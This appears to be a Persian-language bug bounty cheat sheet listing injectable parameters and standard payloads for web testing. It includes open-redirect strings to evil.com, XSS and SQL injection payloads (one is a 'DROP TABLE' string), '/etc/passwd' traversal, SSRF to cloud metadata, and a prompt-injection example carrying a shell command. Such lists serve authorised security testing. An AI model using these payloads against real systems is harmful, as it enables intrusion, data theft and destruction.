# hunter payload

1. نقاط ورودی رایج برای تزریق پیلود
محل تزریق	توضیح	مثال
پارامترهای URL (Query Params)	هر چیزی بعد از ? یا &	/search?q=FUZZ
- Path Parameters	بخش‌هایی از URL که متغیر هستند	/user/FUZZ/profile
- POST Form Fields	فیلدهای HTML فرم‌ها	username=FUZZ
- Headers	هدرهای HTTP قابل تغییر	User-Agent: FUZZ
- Cookies	مقدار کوکی‌های Session یا custom	session=FUZZ
- JSON / XML Body	درخواست‌های API	{"id":"FUZZ"} یا <id>FUZZ</id>
- Upload Fields	آپلود فایل با محتوای مخرب	image.jpg حاوی پیلود
- WebSocket Messages	پیام‌های ارسال شده در WS	{"msg":"FUZZ"}
- Redirect URLs	پارامترهایی که URL مقصد را کنترل می‌کنند	/redirect?next=FUZZ
پرامترهای مخفی (Hidden Fields)	فیلدهای hidden در فرم‌ها	<input type="hidden" name="role" value="FUZZ">

2. برای هر نوع آسیب‌پذیری کجا تزریق کنیم؟
آسیب‌پذیری	نقاط ورودی مهم
- XSS	فرم‌ها، پارامتر URL، JSON، هدرهایی که در پاسخ نمایش داده می‌شوند
- SQL Injection	هر پارامتر که با دیتابیس تعامل دارد (فیلترها، سرچ، ورود، API)
- Open Redirect	پارامترهایی که مقصد URL را تعیین می‌کنند
- SSRF	ورودی‌هایی که URL را برای درخواست سمت سرور مشخص می‌کنند
- CSRF	فرم‌های حساس (تغییر رمز، ایمیل، نقش کاربر)
- XXE	ورودی XML در آپلود یا API
- Command Injection	ورودی‌هایی که در سیستم‌عامل پردازش می‌شوند
- File Upload	فرم آپلود، API آپلود، Drag & Drop آپلود
- LFI / RFI	پارامترهایی که مسیر فایل را مشخص می‌کنند
- IDOR	شناسه‌ها در URL یا Body که بدون چک مالکیت استفاده می‌شوند

3. نکات شکار سریع
FUZZ کردن: با ابزارهایی مثل ffuf یا burp intruder تمام پارامترها را با پیلود تست کنید.

تحلیل پاسخ: ببینید ورودی‌تان کجا و چطور بازتاب داده می‌شود.

بررسی DevTools: درخواست‌های شبکه و API endpoints را چک کنید.

نسخه‌های API: مسیرهای /v1/، /v2/ و test endpoints را هم بررسی کنید.

=======================================================================

برای پیدا کردن آسیبپذیری در یک سایت یا برنامه وب، باید بدانید کدام قسمتها و پارامترها ممکن است دچار ضعف و نقص امنیتی باشند تا روی آنها payload تزریق کنید. این نکات به شما کمک میکند محل مناسب برای ارسال payload را تشخیص دهید:

نقاط معمول برای ارسال payload جهت بررسی آسیبپذیری
پارامترهای URL

معمولاً پارامترهایی که ورودی کاربر را به صورت مستقیم دریافت میکنند و در URL ظاهر میشوند، مانند:
redirect=, url=, next=, callback=, return=, token=, id=, action=, page=

این پارامترها محل خوبی برای تست آسیبپذیریهای Open Redirect، SQL Injection، XSS و ... هستند.

فرمها و فیلدهای ورودی (POST یا GET)

فرمهای ورود، ثبتنام، جستجو، ارسال پیام و نظرات معمولاً به طور مستقیم دادهها را دریافت میکنند و باید بررسی شوند.

هدرهای HTTP

گاهی هدرهای درخواست مثل Referer, User-Agent, Cookie, X-Forwarded-For نیز محل برای تزریق payload هستند.

مسیرهای (Path) URL

بعضی آدرسها پارامترها را در بخش مسیر URL (مثل /user/12345 یا /product/edit/42) منتقل میکنند که باید آنها را نیز چک کنید.

پارامترهای AJAX و API

برای سایتهای مدرن APIهای مختلفی وجود دارد که پارامترهایی میگیرند، اینها اهمیت ویژهای دارند و باید payload روی آنها ارسال شود.

روشهای پیدا کردن محل مناسب
دسترسی به کد منبع یا مستندات API: اگر دارید، بررسی کنید کجاها ورودی کاربر دریافت میشود.

تحلیل لاگها و رفتار برنامه: ببینید کدام پارامترها تأثیر دارند یا جوابهای متفاوت میدهند.

استفاده از ابزارهای اسکن امنیتی: مانند Burp Suite، OWASP ZAP، که ورودیها و پارامترهای حساس را خودکار شناسایی میکنند.

تست پارامترهای مشکوک: روی پارامترهایی که نامهایی مرتبط با مسیر، ریدایرکت، توکن، ورود و مدیریت دارند بیشتر تمرکز کنید.

خلاصه
برای پیدا کردن آسیبپذیری، معمولا روی پارامترهای ورودی URL و فرمهای وب payload ارسال میشود. در آسیبپذیری Open Redirect معمولاً روی پارامترهایی مثل redirect, url, next و غیره باید تست انجام شود. در XSS معمولاً پارامترهایی که در خروجی HTML نمایش داده میشوند هدف هستند.

اگر سایت یا برنامه خاصی مد نظر دارید، بگویید تا کمک کنم کدام پارامترها یا بخشها احتمال آسیبپذیری بیشتری دارند و روی آنها payload مناسب را بفرستم.

=======================================================================

۱. لیست استاندارد پارامترهای رایج برای تست آسیبپذیری
نوع آسیبپذیری	پارامترهای رایج (نمونه)
- Open Redirect	===>>> redirect, url, next, return, target, callback, dest
- XSS ===>>>	q, search, name, message, comment, input, payload, text
- SQL Injection ===>>>	id, user, username, password, search, page, filter, item


===>>> parameter
```
q, query, search, keyword, k, s, term
id, user, uid, pid, product_id, cat, category
redirect, next, url, return, go, jump, link
page, p, ref, continue, callback
dest, destination, forward, out, view
path, file, dir, folder, include
lang, language, locale
```

برای FUZZ کردن این پارامترها و پیلودها:

```
ffuf -u "https://target.com/page?FUZZ=value" -w params.txt
```

=======================================================================


۲. payloadهای استاندارد برای Open Redirect
شماره	Payload نمونه	توضیح کوتاه
- 1	http://evil.com	آدرس URL ساده و مستقیم
- 2	//evil.com	استفاده از دامنه با دو اسلش
- 3	///evil.com	سه اسلش، دور زدن فیلترهای ساده
- 4	%2F%2Fevil.com	کدگذاری URL دو اسلش
- 5	%2F%5Cevil.com	ترکیب اسلش و بک اسلش کدگذاری شده
- 6	https:%2F%2Fevil.com	کدگذاری قسمتها در URL
- 7	https:/\evil.com	ترکیب اسلش و بک اسلش
- 8	//evil.com%00	استفاده از null byte برای قطع رشته
- 9	%EF%BC%8E%EF%BC%8E%2Fevil.com	استفاده از نقطه fullwidth و اسلش

===>>> parameter
```
redirect, next, url, return, dest, destination
continue, callback, link, goto, jump, out
u, uri, path, page, forward
```
=======================================================================

۳. payloadهای استاندارد برای XSS
شماره	Payload نمونه	توضیح کوتاه
- 1	<script>alert('XSS')</script>	سادهترین کد اجرای اسکریپت
- 2	"><script>alert(1)</script>	تست تزریق در فیلدهای HTML
- 3	'"><img src=x onerror=alert(1)>	تزریق با تگ img و خطا
- 4	<svg/onload=alert(1)>	استفاده از SVG جهت اجرا
- 5	<body onload=alert(1)>	اجرای اسکریپت هنگام بارگذاری صفحه
- 6	"><iframe src="javascript:alert(1)"></iframe>	تست iframe با کد جاوااسکریپت
- 7	javascript:alert(document.cookie)	تست اجرای دستور جاوااسکریپت داخل URL

===>>> parameter
```
q, search, s, term, keyword
message, comment, content, body
title, subject, reply
query, input, name, username
```

=======================================================================


۴. payloadهای استاندارد برای SQL Injection
شماره	Payload نمونه	توضیح کوتاه
- 1	' OR '1'='1	شرط همواره درست برای نفوذ
- 2	' OR 1=1--	نفوذ با کامنت گذاری بقیه کوئری
- 3	' UNION SELECT NULL,NULL--	حمله یونین برای بازیابی داده
- 4	' AND (SELECT COUNT(*) FROM users) > 0--	تست وجود جدول کاربران
- 5	'; DROP TABLE users;--	حمله مخرب حذف جدول
- 6	" OR ""="	شرط همواره درست با کوتیشن دوتایی
- 7	' OR SLEEP(5)--	تست تأخیر (Blind SQL Injection)

```
id, uid, user_id, product_id, pid
cat, category, type, tid
sort, order, dir
filter, report, query
```

=======================================================================

نکات مهم استفاده
همیشه تستها را روی پارامترهای ورودی که توسط برنامه پذیرش میشوند (مثل query string، فرمها، هدرها) انجام دهید.

برای Open Redirect، تمرکز بر پارامترهایی است که URL مقصد میگیرند.

برای XSS، فیلدهای ورودی که در خروجی HTML رندر میشوند هدف قرار گیرند.

برای SQL Injection، پارامترهایی که در کوئریهای دیتابیس استفاده میشوند مورد آزمایش باشند.

تستها را با ترکیبی از کدگذاری URL (مثل %3C, %22, %27) و فاصلههای غیرمعمول به منظور دور زدن فیلترها انجام دهید.


=======================================================================


# لیست استاندارد پارامترها و Payloadهای رایج برای گزارش آسیب‌پذیری

---

## ۱. لیست پارامترهای رایج برای تست آسیب‌پذیری

| نوع آسیب‌پذیری | پارامترهای رایج (نمونه)                             |
|----------------|----------------------------------------------------|
| Open Redirect  | `redirect`, `url`, `next`, `return`, `target`, `callback`, `dest` |
| XSS            | `q`, `search`, `name`, `message`, `comment`, `input`, `payload`, `text` |
| SQL Injection  | `id`, `user`, `username`, `password`, `search`, `page`, `filter`, `item` |

---

## ۲. Payloadهای استاندارد برای Open Redirect

| شماره | Payload نمونه                      | توضیح کوتاه                             |
|-------|----------------------------------|---------------------------------------|
| 1     | `http://evil.com`                 | آدرس URL ساده و مستقیم                |
| 2     | `//evil.com`                     | استفاده از دامنه با دو اسلش          |
| 3     | `///evil.com`                    | سه اسلش، دور زدن فیلترهای ساده       |
| 4     | `%2F%2Fevil.com`                 | کدگذاری URL دو اسلش                   |
| 5     | `%2F%5Cevil.com`                 | ترکیب اسلش و بک اسلش کدگذاری شده     |
| 6     | `https:%2F%2Fevil.com`           | کدگذاری قسمتها در URL                 |
| 7     | `https:/\evil.com`               | ترکیب اسلش و بک اسلش                  |
| 8     | `//evil.com%00`                  | استفاده از null byte برای قطع رشته    |
| 9     | `%EF%BC%8E%EF%BC%8E%2Fevil.com` | استفاده از نقطه fullwidth و اسلش      |

---

## ۳. Payloadهای استاندارد برای XSS

| شماره | Payload نمونه                              | توضیح کوتاه                         |
|-------|--------------------------------------------|-----------------------------------|
| 1     | `<script>alert('XSS')</script>`             | ساده‌ترین کد اجرای اسکریپت        |
| 2     | `"><script>alert(1)</script>`                | تست تزریق در فیلدهای HTML         |
| 3     | `'"><img src=x onerror=alert(1)>`           | تزریق با تگ img و خطا              |
| 4     | `<svg/onload=alert(1)>`                      | استفاده از SVG جهت اجرا            |
| 5     | `<body onload=alert(1)>`                      | اجرای اسکریپت هنگام بارگذاری صفحه |
| 6     | `"><iframe src="javascript:alert(1)"></iframe>` | تست iframe با کد جاوااسکریپت       |
| 7     | `javascript:alert(document.cookie)`           | تست اجرای دستور جاوااسکریپت داخل URL |

---

## ۴. Payloadهای استاندارد برای SQL Injection

| شماره | Payload نمونه                          | توضیح کوتاه                        |
|-------|--------------------------------------|----------------------------------|
| 1     | `' OR '1'='1`                        | شرط همواره درست برای نفوذ        |
| 2     | `' OR 1=1--`                        | نفوذ با کامنت گذاری بقیه کوئری  |
| 3     | `' UNION SELECT NULL,NULL--`        | حمله یونین برای بازیابی داده     |
| 4     | `' AND (SELECT COUNT(*) FROM users) > 0--` | تست وجود جدول کاربران         |
| 5     | `'; DROP TABLE users;--`             | حمله مخرب حذف جدول              |
| 6     | `" OR ""="`                        | شرط همواره درست با کوتیشن دوتایی |
| 7     | `' OR SLEEP(5)--`                   | تست تأخیر (Blind SQL Injection)  |

---

## نکات مهم استفاده

- تست‌ها را روی پارامترهای ورودی که توسط برنامه پذیرش می‌شوند (مثل query string، فرم‌ها، هدرها) انجام دهید.
- برای Open Redirect، تمرکز بر پارامترهایی است که URL مقصد می‌گیرند.
- برای XSS، فیلدهای ورودی که در خروجی HTML رندر می‌شوند را هدف قرار دهید.
- برای SQL Injection، پارامترهایی که در کوئری‌های دیتابیس استفاده می‌شوند مورد آزمایش قرار بگیرند.
- تست‌ها را با کدگذاری URL (مثل `%3C`, `%22`, `%27`) و فاصله‌های غیرمعمول جهت دور زدن فیلترها انجام دهید.

========================================================================

# لیست پارامترها و URLهای مهم برای تست نفوذ وب در باگ بانتی

## پارامترهای معمول تست نفوذ:
- `id`            # برای تست دسترسی به منابع مختلف (IDOR)
- `username`      # برای بررسی آسیب‌پذیری‌های ورود/احراز هویت
- `password`      # بررسی نقاط ضعف احراز هویت و دستکاری پارامترها
- `debug`         # فعال‌سازی حالت دیباگ (ممکن است اطلاعات حساس فاش شود)
- `test`          # پارامتر تست که ممکن است نقاط ضعف در آن نهفته باشد
- `admin`         # برای بررسی دسترسی‌های ادمین یا قابلیت‌های مدیریتی مخفی
- `token`         # توکن‌های احراز هویت و اعتبارسنجی که ضعف دارند
- `redirect`      # بررسی آسیب‌پذیری بازنویسی مسیر (Open Redirect)
- `page`          # تغییر صفحات و بررسی سوئیچینگ مخرب
- `search`        # بررسی تزریق در ورودی جستجو (XSS، SQLi و غیره)

## نمونه URLهای معمول جهت تست:
- `http://example.com/view?id=1`
- `http://example.com/profile?username=admin`
- `http://example.com/login?debug=true`
- `http://example.com/admin?access=1`
- `http://example.com/page?redirect=http://evil.com`
- `http://example.com/search?query=<script>alert(1)</script>`
- `http://example.com/api/resource?token=abcdef123456`
- `http://example.com/item?id=10&test=true`

---

## نکته‌ها:
- علاوه بر این پارامترها، استفاده از ابزارهای فازینگ (Fuzzing) با لیست‌های کلمات کلیدی مانند `admin`, `debug`, `test`, `user`, `pass` و ... برای کشف پارامترهای مخفی بسیار موثر است.
- فایل‌های `robots.txt` و `sitemap.xml` را بررسی کنید تا مسیرها و پارامترهای مخفی احتمالی را کشف کنید.
- جاوااسکریپت‌ها و سورس کد صفحات را برای یافتن ورودی‌ها و پارامترهای مخفی که ممکن است به صورت مستقیم در URL ظاهر نشوند، تحلیل کنید.

این موارد به عنوان نقطه شروع قوی برای کشف و آزمایش آسیب‌پذیری‌ها در باگ بانتی کاربرد دارند و می‌توانید آنها را متناسب با هدف و سناریوی تست خود شخصی‌سازی کنید.  


============================================================================

# 📌 پارامترها و مسیرهای کلیدی برای تست نفوذ وب (Bug Bounty)

| دسته | پارامتر / مسیر | توضیح کاربرد | پتانسیل آسیب‌پذیری |
|------|----------------|--------------|--------------------|
| **Open Redirect** | `redirect`, `url`, `next`, `return`, `dest`, `continue` | تغییر مسیر کاربر | Open Redirect → Account Takeover, SSRF |
| **File Inclusion / Path Traversal** | `file`, `path`, `page`, `template`, `doc`, `/download?file=`, `/view?path=` | بارگذاری فایل یا مسیر | LFI, RFI, Path Traversal |
| **Authentication / Tokens** | `token`, `auth`, `api_key`, `key`, `session` | توکن‌ها و کلیدهای امنیتی | Auth Bypass, Token Leakage |
| **IDOR** | `id`, `uid`, `user_id`, `pid`, `cid`, `/user/1234`, `/order/1001` | شناسه‌های کاربر یا سفارش | IDOR, Privilege Escalation |
| **Search / Query** | `q`, `search`, `keyword`, `query` | جستجو در سیستم | XSS, SQLi |
| **Callback / JSONP** | `callback`, `jsonp`, `cb` | اجرای کد سمت کلاینت | JSONP hijacking, XSS |
| **Upload** | `/upload`, `/media`, `/image`, `avatar`, `file` | آپلود فایل | File Upload, RCE, XSS via SVG |
| **Admin / Config** | `/admin`, `/config`, `/settings`, `/manage` | تنظیمات و کنترل پنل | Privilege Escalation, RCE |
| **API endpoints** | `/api/v1/`, `/graphql`, `/rest/`, `/v2/` | API‌ها و GraphQL | GraphQL Injection, IDOR, Mass Assignment |
| **Debug / Backup** | `/debug`, `/phpinfo`, `/backup.zip`, `/old/` | مسیرهای تست و پشتیبان | Info Disclosure, Code Leak |
| **Payment / Orders** | `/checkout`, `/payment`, `/order`, `/invoice` | تراکنش‌ها و پرداخت | Logic Flaw, Price Manipulation |
| **Misc (Sensitive)** | `/robots.txt`, `/sitemap.xml`, `/git/config`, `.env` | فایل‌های حساس | Info Disclosure, Credential Leak |

============================================================================


مهم‌ترین آسیب‌پذیری‌های مرتبط با تغییر و سوءاستفاده از پارامترها
لیستی از ۱۰ آسیب‌پذیری برتر در متغیرها و URLها که در سال ۲۰۲۵ برای شکارگرهای باگ بسیار حیاتی هستند (مطابق با تجارب عمومی اساتید حوزه):

IDOR (تغییر آی‌دی‌ها در URL برای دسترسی غیرمجاز) 


SQL Injection (تغییر پارامترها با ' OR 1=1) 


XSS (تزریق <script> یا اچ‌تی‌ام‌ال از پارامترها) 


SSRF (استفاده از پارامترهای URL برای ارجاع به آدرس‌های داخلی) 


Open Redirect (تغییر redirect URL به مقصد خارجی) 


HTTP Parameter Pollution (ارسال چندباره‌ی پارامتر) 


Directory Listing یا دسترسی مستقیم به فایل‌ها با URLها 


Sensitive Data in URL (قرار دادن توکن یا اطلاعات حساس در URL) 


Missing Security Headers (بررسی پاسخ‌های header برای CSP، HSTS و…) 


Broken Access Control / Business Logic Flaws (دستکاری پارامترها برای دور زدن کنترل‌های مجوز یا منطق‌های تجاری) 

============================================================================

پارامترهای مانند id, user, redirect, file, url, token, page, next, view و مشابه آن‌ها را در URL یا فرم‌ها هدف تغییر قرار دهید.

============================================================================

# 🐞 Bug Bounty Checklist 2025 (فنی + منطقی)

## 📌 مثال‌های واقعی

### 1. Path Traversal با بک‌اسلش
https://cashback.opera.com/pl/en/nike/offer?id=..\..\..\pwn

- علت: فیلتر `/` ولی نادیده‌گیری `\`
- گزارش: Client-Side Path Traversal (Opera Cashback)

### 2. Open Redirect در صفحه لاگین
https://target.com/login?redirect_url=https://evil.com

- علت: عدم اعتبارسنجی دامنه مقصد
- کاربرد: Phishing یا Chain به SSRF

### 3. SSRF از پارامتر `url`
https://search.gov/?url=http://127.0.0.1:8000/admin

- علت: ارسال درخواست سرور به آدرس داخلی
- گزارش: HackerOne #514224

---

## 📋 چک‌لیست مرحله‌ای

### 1. Recon (شناسایی)
- جمع‌آوری Subdomains, Endpoints با **Amass, FFUF, HTTPX, GAU**
- استخراج endpoint و پارامتر از **JavaScript/CSS**
- ابزار پیشنهادی: `arjun`, `hakrawler`, `linkfinder`

### 2. Parameter Discovery & Fuzzing
- پارامترهای مهم:
id, user, uid, redirect, url, next, returnUrl, token, file, path, page, dest

- تکنیک‌ها:
  - Parameter Pollution
  - تغییر ترتیب پارامترها
  - اضافه کردن مقادیر غیرمنتظره

### 3. آسیب‌پذیری‌های رایج
- **XSS** → بازتابی، ذخیره‌ای، DOM
- **SQLi**, **XXE**, **Command Injection**
- **Open Redirect** → تست پارامترهای `url`, `redirect_uri`, `next`
- **SSRF** → bypass با redirect یا DNS rebinding
- **LFI/RFI** → تست مسیرهای `/etc/passwd`, log files
- **File Upload** → بای‌پس MIME و پسوند

### 4. باگ‌های منطقی (Business Logic Flaws)
- IDOR پیچیده در مراحل چندگانه
- تغییر hidden fields
- دور زدن validation سمت کلاینت
- سوءاستفاده از کوپن و تخفیف
- Race Condition (double spending, coupon abuse)

### 5. Bug Chaining
- Open Redirect → SSRF → Data Leak
- XSS → سرقت JWT/Token
- LFI → RCE با log poisoning

### 6. گزارش‌دهی سریع
- **PoC واضح** (مرحله به مرحله)
- **Impact**: مالی، داده، کنترل حساب
- اسکرین‌شات + کد اکسپلویت
- پیشنهاد رفع باگ

---

## 📂 ساختار پیشنهادی گزارش
1. عنوان: کوتاه و دقیق
2. توضیح: شرح آسیب‌پذیری
3. گام‌ها: PoC مرحله‌ای
4. اثر: تاثیر امنیتی یا مالی
5. توصیه: راهکار رفع

---

## 🛠 ابزارهای پیشنهادی
- Recon: `amass`, `subfinder`, `httpx`, `gau`
- Parameter discovery: `arjun`, `ffuf`
- Exploit: `burp`, `sqlmap`, `xray`
- JS analysis: `linkfinder`, `JSFinder`


============================================================================

| پارامتر       | نوع آسیب‌پذیری                    | مثال                                |
|---------------|---------------------------------|-----------------------------------|
| callback      | XSS + JSONP Hijacking            | `?callback=alert(1)`               |
| redirect_uri  | Open Redirect + SSRF             | `?redirect_uri=evil.com`           |
| file          | LFI/RFI                         | `?file=../../etc/passwd`           |
| documentUrl   | DOM XSS                        | `?documentUrl=javascript:alert(1)`|
| __proto__     | Prototype Pollution             | `?__proto__[polluted]=true`        |
| service       | SSRF (AWS/GCP Metadata)         | `?service=http://169.254.169.254`  |
| token         | JWT Manipulation                | Header: `Bearer eyJ...` (دستکاری JWT) |
| preview       | SSTI (Server-Side Template Inj.) | `?preview={{7*7}}`                 |
| aiModel       | Prompt Injection (AI)           | `?aiModel=system; cat /etc/passwd` |


============================================================================

